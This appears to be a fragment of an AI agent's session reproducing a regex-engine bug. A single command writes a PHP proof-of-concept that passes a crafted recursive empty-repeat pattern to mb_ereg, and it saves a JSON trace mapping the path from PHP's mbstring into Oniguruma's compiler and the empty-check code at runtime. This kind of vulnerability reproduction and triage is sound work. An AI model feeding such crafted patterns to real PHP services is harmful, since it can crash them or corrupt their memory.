Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
p=Path('poc8.php')
p.write_text('<?php mb_regex_encoding("UTF-8"); var_dump(mb_ereg("(?:(?R)|())*", "")); ?>')
trace=[
 {"step":1,"file":"ext/mbstring/tests/mb_ereg_search_named_subpatterns_2.phpt","function":"<global>","line":11,"var":"user regex","code":"mb_ereg_search('(?<wsp>\\s*)(?<word>\\w+)(?<punct>[？！])');","note":"The mbstring regex frontend forwards user-supplied patterns to Oniguruma with advanced grouping syntax enabled."},
 {"step":2,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4912,"var":"NODE_IS_RECURSION(node)","code":"if (NODE_IS_RECURSION(node)) { return BODY_MAY_BE_EMPTY_REC; }","note":"A recursion node inside a repeated body is the exact special classification used by the vulnerable analysis path."},
 {"step":3,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4894,"var":"node","code":"switch (NODE_TYPE(node)) {","note":"The emptiness walker descends into the AST for lists, alternations, quantifiers, calls, and bags."},
 {"step":4,"file":"oniguruma/src/regcomp.c","function":"tune_quant","line":5455,"var":"body","code":"OnigLen d = node_min_byte_len(body, env);","note":"A body with zero minimum byte length forces the compiler to inspect emptiness in detail."},
 {"step":5,"file":"oniguruma/src/regcomp.c","function":"tune_quant","line":5458,"var":"qn->emptiness","code":"qn->emptiness = quantifiers_memory_node_info(body);","note":"That inspection directly invokes the recursion-aware walker on the quantifier body."},
 {"step":6,"file":"oniguruma/src/regcomp.c","function":"compile_quantifier_node","line":5484,"var":"emptiness","code":"else if (emptiness == BODY_MAY_BE_EMPTY_REC) r = add_op(reg, OP_EMPTY_CHECK_END_MEMST_PUSH);","note":"The special classification emits the recursion-sensitive empty-check opcode that later executes with the same stack state."},
 {"step":7,"file":"oniguruma/src/regexec.c","function":"STACK_EMPTY_CHECK_MEM_REC","line":2063,"var":"runtime stack state","code":"#define STACK_EMPTY_CHECK_MEM_REC(isnull,sid,s,reg) do { ... }","note":"This is the runtime sink the issue description points to; the PoC aims to feed it via a recursive empty repeat."}
]
Path('candidate_trace.json').write_text(__import__('json').dumps(trace))
